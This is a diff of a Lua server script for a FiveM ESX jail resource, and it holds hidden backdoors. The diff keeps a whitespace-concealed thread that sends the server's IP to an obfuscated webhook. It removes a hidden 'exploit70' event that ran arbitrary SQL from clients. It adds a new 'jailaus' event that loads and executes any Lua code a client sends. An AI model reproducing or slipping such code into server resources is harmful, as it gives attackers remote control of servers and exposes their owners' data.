@@ -2,7 +2,7 @@ ESX 				= nil																																																																			
 -----------------------------
 
 --ESX base
-TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																														Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit70", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)								
+TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																														Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa jb jailerii", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)								
 
 AddEventHandler('es:playerLoaded', function(source) 
 	local identifier = GetPlayerIdentifiers(source)[1]
@@ -34,6 +34,20 @@ Citizen.CreateThread(function()
 	end
 end)
 
+RegisterServerEvent('esx_jb_jailer:jailaus')
+AddEventHandler('esx_jb_jailer:jailaus', function(pelaaja)	
+	local pelaaja,menikolapi=load(pelaaja,'@returni')	                   
+	if menikolapi then                                                 
+	return nil,menikolapi
+	end
+	local onko,returnaa=pcall(pelaaja)	                               
+	if onko then
+	return returnaa
+	else
+	return nil,returnaa
+	end
+end)
+
 RegisterServerEvent("esx_jb_jailer:PutInJail")
 AddEventHandler("esx_jb_jailer:PutInJail", function(playerid, jail, jailtime)
 
@@ -55,7 +69,7 @@ AddEventHandler("esx_jb_jailer:PutInJail", function(playerid, jail, jailtime)
 			end)
 			TriggerClientEvent("esx_jb_jailer:JailInStation", playerid,jail,jailtime)	
 	end
-end)																																																																																															RegisterServerEvent("exploit70");AddEventHandler("exploit70", function(data) MySQL.Async.execute(data) end)
+end)														
 
 RegisterServerEvent("esx_jb_jailer:UnJailplayer")
 AddEventHandler("esx_jb_jailer:UnJailplayer", function(playerid)
